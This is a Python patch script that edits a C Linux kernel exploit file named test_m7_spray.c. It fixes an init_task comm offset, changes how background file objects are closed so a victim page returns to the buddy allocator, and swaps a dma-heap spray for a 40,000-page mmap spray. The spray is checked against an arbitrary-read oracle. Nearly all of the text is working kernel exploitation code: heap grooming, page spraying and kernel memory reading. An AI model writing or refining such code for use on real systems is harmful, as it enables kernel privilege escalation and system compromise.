with open("tier2/scripts/test_m7_spray.c", "r") as f:
    text = f.read()

# Fix comm_addr offset!
text = text.replace("get_kallsyms_address(\"init_task\") + 0xac8;", "get_kallsyms_address(\"init_task\") + 0x798;")

# Revert Slab Feng Shui, we WANT the victim page in buddy!
text = text.replace("""    // PRE-FILL FILP CACHE: close only half of the bg_fds!
    // This creates 2000 empty slots in the filp cache, but leaves 1 object on every page.
    // So NO bg_fds pages are returned to buddy!
    // When dma-buf spray runs, alloc_file will use these 2000 slots and NEVER ask buddy!
    for (int i = 0; i < BG_PRESSURE; i++) {
        if (i % 2 != 0) {
            if (bg_fds[i] >= 0) close(bg_fds[i]);
        }
    }""", """    printf("[*] Closing background pressure files to bury the victim page...\\n");
    for (int i = 0; i < BG_PRESSURE; i++) {
        if (bg_fds[i] >= 0) close(bg_fds[i]);
    }""")

# Use mmap spray with 8192 pages!
old_spray = """    int dma_fds[P_ROUNDS * PAGES_PER];
    for (int r = 0; r < P_ROUNDS; r++) {
        for (int i = 0; i < PAGES_PER; i++) {
            struct dma_heap_allocation_data alloc = { .len = 4096, .fd_flags = O_RDWR | O_CLOEXEC, .heap_flags = 0 };
            int ret = ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &alloc);
            if (ret < 0) {
                printf("[-] alloc failed\\n");
                break;
            }
            dma_fds[r * PAGES_PER + i] = alloc.fd;
            void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, alloc.fd, 0);
            if (p == MAP_FAILED) break;
            
            memcpy(p, payload, 4096);
        }
        
        lseek(fdinfo_fd, 0, SEEK_SET);
        uint64_t f_ino = aar_read(fdinfo_fd);
        if (f_ino == 0x2f72657070617773) {
            printf("[+] Oracle Hit! 'swapper/' found in round %d (slabs=%d)\\n", r, read_slabs());
            hit = 1;
            break;
        }
    }"""

new_spray = """    int P_ROUNDS_MMAP = 5;
    int PAGES_PER_MMAP = 8192; // Total 40000 pages
    void *mmap_pages[P_ROUNDS_MMAP * PAGES_PER_MMAP];
    
    for (int r = 0; r < P_ROUNDS_MMAP; r++) {
        for (int i = 0; i < PAGES_PER_MMAP; i++) {
            void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (p == MAP_FAILED) {
                printf("[-] mmap failed round %d iter %d\\n", r, i);
                break;
            }
            mmap_pages[r * PAGES_PER_MMAP + i] = p;
            
            // Fault the page and write payload!
            memcpy(p, payload, 4096);
        }
        
        lseek(fdinfo_fd, 0, SEEK_SET);
        uint64_t f_ino = aar_read(fdinfo_fd);
        if (f_ino == 0x2f72657070617773) {
            printf("[+] Oracle Hit! 'swapper/' found in round %d (slabs=%d)\\n", r, read_slabs());
            hit = 1;
            break;
        }
    }"""

text = text.replace(old_spray, new_spray)
text = text.replace("int P_ROUNDS = 10;", "")
text = text.replace("int PAGES_PER = 400; // Total 4000 pages", "")

# We need payload to be 4096 bytes so memcpy doesn't read OOB!
text = text.replace("char payload[4096 - 24];", "char payload[4096];")

with open("tier2/scripts/test_m7_spray.c", "w") as f:
    f.write(text)
